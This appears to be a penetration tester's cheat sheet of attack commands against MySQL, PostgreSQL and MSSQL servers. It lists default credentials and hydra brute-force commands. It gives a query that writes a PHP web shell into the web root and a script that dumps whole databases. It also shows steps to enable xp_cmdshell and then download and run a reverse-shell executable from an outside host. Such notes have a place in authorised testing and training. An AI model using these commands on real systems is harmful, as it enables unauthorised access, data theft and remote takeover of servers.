#### MYSQL
```
#login
mysql -u <user> -p'<pass>' -h <ip_address> -P 3306          

#Default credentials
root : '' 
root : 'root'

#Brute Force
hydra -l root -P /usr/share/wordlists/rockyou.txt <host> mysql -t 10

#Enumeration Commands (https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql)

#Insert php shell.
SELECT '<?php exec($_GET[''cmd'']); ?>' FROM mytable INTO dumpfile ‘/var/www/html/shell.php’

#If you can't crack the hash inside, try updating the hash instead.

#More tricks to priv esc or get shell.
https://security.stackexchange.com/questions/6919/leveraging-a-shell-from-sql-injection

#If you dont have mysql client can use this -> really nice shell interactive just extract with tar.
https://dev.mysql.com/downloads/shell/
```

#### Dumping DB
```
#!/bin/bash

TABLES_FILE="tables.txt"

while read -r TABLE_LINE; do
    mysql -e "SELECT * FROM $TABLE_LINE;" -p'pass' -D db -h host >> dump.sql
done < "$TABLES_FILE"

```
#### POSTGRESQL
```
#Connect
psql -h <ip> -U <user> -p <port>

#Default credentials
postgres : postgres

#Brute Force
hydra -l postgres -P /usr/share/wordlists/rockyou.txt <host> postgres -t 10

#Enumeration commnads (https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql)
```
#### MSSQL
```
impacket-mssqlclient <user>:<pass>@<ip_address> -windows-auth

#Brute Force
hydra -l <user> -P /usr/share/wordlists/rockyou.txt <host> mssql -t 10

#Enable xp_cmdshell
sp_configure 'show advanced options', 1
RECONFIGURE
sp_configure 'xp_cmdshell', 1
RECONFIGURE

#Get Reverse Shell.
xp_cmdshell powershell.exe iwr -uri http://10.10.93.147:1234/myshell.exe -Outfile C:\temp\myshell.exe
xp_cmdshell C:\temp\myshell.exe


#Common Enumeration (https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
```